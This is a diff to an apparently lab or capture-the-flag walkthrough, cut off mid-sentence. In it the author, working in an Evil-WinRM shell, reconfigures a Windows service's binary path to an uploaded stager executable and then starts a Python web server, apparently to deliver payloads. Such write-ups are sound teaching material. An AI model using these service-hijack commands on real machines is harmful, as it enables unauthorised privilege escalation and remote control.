@@ -1014,5 +1014,16 @@ Info: Upload successful!
 Ill upload it to programdata
 
 ```python
-
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> sc.exe config CTOSInventorySvc binPath= "C:\programdata\stager.exe"
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService>
 ```
+
+Ill then set the execution path to the stager
+
+```python
+python3 -m http.server 80              
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Ill then setup a 
